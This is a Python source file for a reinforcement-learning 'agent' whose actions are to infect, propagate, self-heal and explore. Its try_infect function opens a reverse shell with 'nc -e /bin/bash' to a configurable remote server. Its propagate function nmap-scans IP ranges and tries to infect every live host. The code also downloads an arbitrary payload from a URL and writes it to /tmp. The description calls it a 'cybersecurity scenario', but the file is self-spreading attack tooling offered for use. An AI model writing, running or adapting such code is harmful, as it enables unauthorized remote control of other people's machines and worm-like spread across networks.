import argparse
import ipaddress
import json
import logging
import os
import shutil
import subprocess
import sys
import urllib.request
import urllib.parse
import yaml
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path
from typing import Any, Dict, List, NamedTuple, Optional, Tuple
import numpy as np
import psutil
import socket
import nmap
import random

class Config:
    def __init__(self, config_path: str = "config.yaml"):
        self.config_path = config_path
        self.data = self._load_config()
        self._setup_logging()
    
    def _load_config(self) -> Dict[str, Any]:
        try:
            with open(self.config_path, 'r') as f:
                return yaml.safe_load(f)
        except FileNotFoundError:
            logger.warning(f"Config file {self.config_path} not found, using defaults")
            return self._get_defaults()
        except yaml.YAMLError as e:
            logger.error(f"Error parsing config file: {e}")
            return self._get_defaults()
    
    def _get_defaults(self) -> Dict[str, Any]:
        return {
            'learning': {
                'max_episodes': 1000,
                'max_state': 10000,
                'learning_rate': 0.1,
                'discount_factor': 0.9,
                'initial_exploration_probability': 1.0,
                'exploration_decay': 0.995
            },
            'rewards': {'success': 10, 'failure': -5},
            'memory': {'long_term_capacity': 1000, 'max_memory_mb': 100},
            'network': {
                'remote_server': 'example.com',
                'port': 8080,
                'netcat_binary': '/bin/nc',
                'connection_timeout': 5
            },
            'payload': {
                'max_size_mb': 10,
                'allowed_url_schemes': ['http', 'https']
            },
            'logging': {
                'level': 'INFO',
                'file': 'dbe.log',
                'format': '%(asctime)s - %(name)s - %(levelname)s - %(message)s'
            }
        }
    
    def _setup_logging(self):
        log_config = self.data.get('logging', {})
        level = getattr(logging, log_config.get('level', 'INFO'))
        logging.basicConfig(
            level=level,
            format=log_config.get('format', '%(asctime)s - %(name)s - %(levelname)s - %(message)s'),
            handlers=[
                logging.FileHandler(log_config.get('file', 'dbe.log')),
                logging.StreamHandler()
            ],
            force=True
        )
    
    def get(self, *keys, default=None):
        value = self.data
        for key in keys:
            if isinstance(value, dict):
                value = value.get(key)
            else:
                return default
            if value is None:
                return default
        return value

config = Config()
logger = logging.getLogger(__name__)

def validate_ip(ip: str) -> bool:
    """Validate IP address format."""
    try:
        ipaddress.ip_address(ip)
        return True
    except ValueError:
        return False

def validate_url(url: str, allowed_schemes: Optional[List[str]] = None) -> bool:
    """Validate URL format and scheme."""
    if allowed_schemes is None:
        allowed_schemes = config.get('payload', 'allowed_url_schemes', default=['http', 'https'])
    try:
        parsed = urllib.parse.urlparse(url)
        if parsed.scheme not in allowed_schemes:
            logger.error(f"URL scheme {parsed.scheme} not in allowed schemes {allowed_schemes}")
            return False
        if not parsed.netloc:
            logger.error(f"URL {url} has no network location")
            return False
        return True
    except Exception as e:
        logger.error(f"URL validation error: {e}")
        return False

class State(NamedTuple):
    ip: str
    state_number: int

class LongTermMemory:
    def __init__(self, capacity=1000):
        self.memory = []
        self.memory_index = {}
        self.capacity = capacity

    def store(self, experience):
        state, action, reward, next_state = experience
        self.memory.append(experience)
        
        if state not in self.memory_index:
            self.memory_index[state] = []
        self.memory_index[state].append(experience)
        
        if len(self.memory) > self.capacity:
            old_exp = self.memory.pop(0)
            old_state = old_exp[0]
            if old_state in self.memory_index:
                self.memory_index[old_state].remove(old_exp)
                if not self.memory_index[old_state]:
                    del self.memory_index[old_state]

    def retrieve(self, state):
        return self.memory_index.get(state, [])

    def best_action(self, state: State) -> Optional[int]:
        experiences = self.retrieve(state)
        if experiences:
            actions = {}
            for s, a, r, next_s in experiences:
                if a not in actions:
                    actions[a] = []
                actions[a].append(r)
            return max(actions, key=lambda x: np.mean(actions[x])) if actions else None
        return None

long_term_memory = LongTermMemory(capacity=config.get('memory', 'long_term_capacity', default=1000))

NETCAT_BINARY = config.get('network', 'netcat_binary', default='/bin/nc')
MAX_EPISODES = config.get('learning', 'max_episodes', default=1000)
MAX_STATE = config.get('learning', 'max_state', default=10000)
REWARD_SUCCESS = config.get('rewards', 'success', default=10)
REWARD_FAILURE = config.get('rewards', 'failure', default=-5)
DISCOUNT_FACTOR = config.get('learning', 'discount_factor', default=0.9)
LEARNING_RATE = config.get('learning', 'learning_rate', default=0.1)
MAX_MEMORY = config.get('memory', 'max_memory_mb', default=100)
INITIAL_EXPLORATION_PROBABILITY = config.get('learning', 'initial_exploration_probability', default=1.0)
EXPLORATION_DECAY = config.get('learning', 'exploration_decay', default=0.995)

REMOTE_SERVER = config.get('network', 'remote_server', default='example.com')
PORT = config.get('network', 'port', default=8080)
PAYLOAD = None

action_map = {
    0: "try_infect",
    1: "perform_self_healing",
    2: "propagate",
    3: "check_self_awareness",
    4: "explore_environment",
}


def symbolic_reasoning(state: State) -> Optional[int]:
    """Use symbolic reasoning to choose an action based on the state."""
    if state.state_number < 10:
        return 0  # Try infecting when in early states
    elif state.state_number < 50:
        return 2  # Propagate when in intermediate states
    elif state.state_number >= 50:
        return 1  # Perform self-healing when in later states
    return None


def try_infect(ip: str) -> bool:
    """Try to infect a machine with an IP address of ip."""
    global PAYLOAD
    try:
        if PAYLOAD:
            payload_file = f"/tmp/payload_{ip.replace('.', '_')}.sh"
            with open(payload_file, 'w') as f:
                f.write(PAYLOAD)
            logger.debug(f"Wrote payload to {payload_file}")
        
        subprocess.run([NETCAT_BINARY, "-e", "/bin/bash", REMOTE_SERVER, str(PORT)],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
        logger.info(f"Successfully infected {ip}")
        return True
    except subprocess.TimeoutExpired:
        logger.warning(f"Infection attempt on {ip} timed out")
        return False
    except FileNotFoundError:
        logger.error(f"Netcat binary not found at {NETCAT_BINARY}")
        return False
    except (subprocess.CalledProcessError, IOError) as e:
        logger.error(f"Infection attempt on {ip} failed: {e}")
        return False

def perform_self_healing(ip: str) -> bool:
    """Perform self-healing actions."""
    try:
        pid = os.getpid()
        os.kill(pid, 0)  # Check if process exists
    except OSError:
        return False
    
    src = Path("/path/to/original/file")  # Replace with your actual paths
    dst = Path("/path/to/compromised/file")
    if not src.exists() or not dst.exists() or src.samefile(dst):
        return False

    try:
        shutil.copyfile(src, dst)
        logger.info(f"Self-healing: copied {src} to {dst}")
        os.execv(sys.executable, ['python'] + sys.argv)
        return True
    except Exception as e:
        logger.error(f"Self-healing failed: {e}")
        return False


def propagate(ip_range: List[str]) -> bool:
    """Scan for and attempt to infect vulnerable machines."""
    vulnerable_machines = []
    with ThreadPoolExecutor() as executor:
        future_to_ip = {executor.submit(is_vulnerable, ip): ip for ip in ip_range}
        for future in future_to_ip:
            ip = future_to_ip[future]
            try:
                if future.result():
                    vulnerable_machines.append(ip)
                    logger.info(f"Found vulnerable machine: {ip}")
            except Exception as e:
                logger.error(f"Error checking vulnerability of {ip}: {e}")

    for ip in vulnerable_machines:
        try_infect(ip)

    return len(vulnerable_machines) > 0



def is_vulnerable(ip: str) -> bool:

    """Check if a host is deemed vulnerable (example implementation)."""
    nm = nmap.PortScanner()
    try:
        nm.scan(hosts=ip, arguments='-F') # Fast scan
        for host in nm.all_hosts():
            if nm[host].state() == 'up':
                return True  # Consider host vulnerable if up regardless of port status
        return False
    except nmap.PortScannerError as e:
        logger.error(f"Nmap scan error for {ip}: {e}")
        return False




def check_self_awareness(ip: str) -> bool:
    """Check if agent is aware of its own state/status."""
    try:
        mem_usage = psutil.Process(os.getpid()).memory_info().rss / (1024 * 1024)
        if mem_usage > MAX_MEMORY:
            return False
        return True
    except Exception as e:
        logger.error(f"Self-awareness check error: {e}")
        return False



def explore_environment(ip: str) -> bool:
  """Gather information about the local environment (example)."""
  try:
      hostname = socket.gethostname()
      local_ip = socket.gethostbyname(hostname)
      logger.info(f"Explored environment: Hostname={hostname}, IP={local_ip}")
      return True
  except Exception as e:
      logger.error(f"Environment exploration error: {e}")
      return False

action_dispatch = {
    "try_infect": try_infect,
    "perform_self_healing": perform_self_healing,
    "propagate": lambda ip: propagate([ip]),
    "check_self_awareness": check_self_awareness,
    "explore_environment": explore_environment,
}

def update_state(state: State, action: int) -> State:
    """Update the current state based on the action taken."""
    state_updates = {
        0: lambda s: State(s.ip, s.state_number + 1),
        1: lambda s: State(s.ip, max(0, s.state_number - 1)),  # Prevent negative state numbers
        2: lambda s: State(s.ip, s.state_number * 2),
        3: lambda s: State(s.ip, s.state_number // 2),
        4: lambda s: State(s.ip, s.state_number + 5),
    }
    return state_updates.get(action, lambda s: s)(state)



def download_payload(payload_url: str, max_size: Optional[int] = None) -> str:
    """Download the payload from a URL with size limit."""
    if max_size is None:
        max_size = config.get('payload', 'max_size_mb', default=10) * 1024 * 1024
    
    if not validate_url(payload_url):
        logger.critical(f"Invalid payload URL: {payload_url}")
        sys.exit(1)
    
    try:
        with urllib.request.urlopen(payload_url) as f:
            content_length = f.getheader('Content-Length')
            if content_length and int(content_length) > max_size:
                logger.critical(f"Payload size {content_length} exceeds maximum {max_size}")
                sys.exit(1)
            
            payload = f.read(max_size).decode("utf-8")
            logger.info(f"Successfully downloaded payload from {payload_url} ({len(payload)} bytes)")
            return payload
    except urllib.error.URLError as e:
        logger.critical(f"Payload download failed: {e}")
        sys.exit(1)

def curriculum_learning_setup(ip_range: List[str]) -> List[str]:
    """Setup curriculum learning (example: sort by last octet)."""
    validated_ips = []
    for ip in ip_range:
        if validate_ip(ip):
            validated_ips.append(ip)
        else:
            logger.warning(f"Skipping invalid IP: {ip}")
    
    if not validated_ips:
        logger.critical("No valid IP addresses provided")
        sys.exit(1)
    
    return sorted(validated_ips, key=lambda ip: int(ip.split('.')[-1]) if '.' in ip and ip.split('.')[-1].isdigit() else float('inf'))

def choose_action(q_table, state, exploration_probability):
    best_ltm_action = long_term_memory.best_action(state)
    if best_ltm_action is not None:
        return best_ltm_action

    symbolic_action = symbolic_reasoning(state)
    if symbolic_action is not None:
        return symbolic_action

    if np.random.rand() < exploration_probability:
        return random.choice(list(action_map.keys()))
    else:
        if state in q_table and q_table[state]:
            return max(q_table[state], key=q_table[state].get)
        else:
            return random.choice(list(action_map.keys()))

def save_q_table(q_table: Dict, filepath: str = "q_table.json"):
    """Save Q-table to file in JSON format."""
    try:
        serializable_q_table = {}
        for state, actions in q_table.items():
            key = f"{state.ip}_{state.state_number}"
            serializable_q_table[key] = actions
        
        with open(filepath, 'w') as f:
            json.dump(serializable_q_table, f, indent=2)
        logger.info(f"Q-table saved to {filepath} ({len(q_table)} states)")
    except Exception as e:
        logger.error(f"Failed to save Q-table: {e}")

def load_q_table(filepath: str = "q_table.json") -> Dict:
    """Load Q-table from file."""
    if not os.path.exists(filepath):
        logger.info(f"Q-table file {filepath} not found, starting fresh")
        return {}
    
    try:
        with open(filepath, 'r') as f:
            serializable_q_table = json.load(f)
        
        q_table = {}
        for key, actions in serializable_q_table.items():
            ip, state_number = key.rsplit('_', 1)
            state = State(ip, int(state_number))
            q_table[state] = actions
        
        logger.info(f"Q-table loaded from {filepath} ({len(q_table)} states)")
        return q_table
    except Exception as e:
        logger.error(f"Failed to load Q-table: {e}")
        return {}

def take_action(action: int, ip: str, current_state: State) -> Tuple[Optional[float], Optional[State]]:
    """Take an action and return the reward and the next state."""
    action_name = action_map.get(action)
    if action_name:
        action_function = action_dispatch.get(action_name)
        if action_function:
            success = action_function(ip)
            reward = REWARD_SUCCESS if success else REWARD_FAILURE
            next_state = update_state(current_state, action) if success else None
            return reward, next_state
        else:
            logger.error(f"Action function '{action_name}' not found in dispatch table")
            return REWARD_FAILURE, None
    else:
        logger.error(f"Invalid action: {action}")
        return REWARD_FAILURE, None

def setup_training(payload_url: str, ip_range: List[str], load_model: bool = False):
    """Initialize training environment and load resources."""
    global PAYLOAD
    PAYLOAD = download_payload(payload_url)
    validated_ips = curriculum_learning_setup(ip_range)
    q_table = load_q_table() if load_model else {}
    return q_table, validated_ips

def train_single_ip(q_table: Dict, ip: str, exploration_probability: float) -> Dict:
    """Train the agent on a single IP address."""
    state = State(ip, 0)
    
    while True:
        if state not in q_table:
            q_table[state] = {action: 0.0 for action in action_map}
        
        action = choose_action(q_table, state, exploration_probability)
        reward, next_state = take_action(action, state.ip, state)
        
        if next_state is not None:
            if next_state not in q_table:
                q_table[next_state] = {action: 0.0 for action in action_map}
            
            next_action = choose_action(q_table, next_state, exploration_probability)
            q_table[state][action] += LEARNING_RATE * (
                reward + DISCOUNT_FACTOR * q_table[next_state][next_action] - q_table[state][action]
            )
            
            long_term_memory.store((state, action, reward, next_state))
        
        state = next_state if next_state else state
        
        if check_self_awareness(state.ip) or state.state_number >= MAX_STATE:
            break
    
    return q_table

def train_episode(q_table: Dict, ip_range: List[str], episode: int, exploration_probability: float) -> Dict:
    """Execute one complete training episode."""
    for ip in ip_range:
        q_table = train_single_ip(q_table, ip, exploration_probability)
    
    if episode % 10 == 0:
        if ip_range:
            perform_self_healing(ip_range[0])
            propagate(ip_range)
    
    return q_table

def finalize_training(q_table: Dict, save_model: bool = True):
    """Save final Q-table and cleanup."""
    if save_model:
        save_q_table(q_table, "q_table_final.json")
    logger.info(f"Training complete. Final Q-table size: {len(q_table)} states")

def main(ip_range, remote_server, port, payload_url, load_model: bool = False, save_model: bool = True):
    q_table, validated_ips = setup_training(payload_url, ip_range, load_model)
    exploration_probability = INITIAL_EXPLORATION_PROBABILITY
    
    for episode in range(MAX_EPISODES):
        q_table = train_episode(q_table, validated_ips, episode, exploration_probability)
        
        exploration_probability *= EXPLORATION_DECAY
        logger.info(f"Episode {episode+1}/{MAX_EPISODES} completed. Exploration probability: {exploration_probability:.4f}")
        
        if save_model and (episode + 1) % 100 == 0:
            save_q_table(q_table, f"q_table_episode_{episode+1}.json")
    
    finalize_training(q_table, save_model)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="A Q-learning agent for a cybersecurity scenario.")
    parser.add_argument("ip_range", nargs="+", type=str, help="A list of IP addresses to scan.")
    parser.add_argument("--remote-server", type=str, default="example.com", help="The remote server to connect to.")
    parser.add_argument("--port", type=int, default=8080, help="The port to connect to on the remote server.")
    parser.add_argument("--payload-url", type=str, required=True, help="The URL of the payload to download and execute.")
    parser.add_argument("--load-model", action="store_true", help="Load Q-table from previous training.")
    parser.add_argument("--no-save", action="store_true", help="Do not save Q-table after training.")
    args = parser.parse_args()

    main(args.ip_range, args.remote_server, args.port, args.payload_url, 
         load_model=args.load_model, save_model=not args.no_save)
